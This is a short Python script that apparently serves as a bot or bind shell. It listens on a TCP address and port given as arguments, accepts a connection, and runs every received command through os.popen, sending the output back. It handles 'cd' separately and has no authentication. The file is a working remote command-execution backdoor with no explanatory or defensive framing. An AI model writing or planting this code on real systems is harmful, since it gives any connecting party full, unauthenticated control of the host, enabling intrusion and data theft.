#-*-coding: utf-8-*-

from socket import * 
import os
from sys import argv
import threading

class Bot:
	def __init__(self):
		self.sock = socket(AF_INET, SOCK_STREAM)
		self.sock.bind((str(argv[1]), int(argv[2])))
		self.sock.listen(1)
		conn, addr = self.sock.accept()
		print("Connection stablished: {}".format(addr))
		while True:
			cmd = conn.recv(1024).decode()
			cmd = cmd.lower()
			if cmd[:2] == "cd":
				try:
					os.chdir(cmd[3:])
				except Exception as e:
					conn.send("{}.\n{}".format(e,cmd[3:]).encode())
				else:
					conn.send(os.getcwd().encode())
			else:
				output = os.popen(cmd).read()
				conn.send(output.encode())
if __name__ == '__main__':
	main = Bot()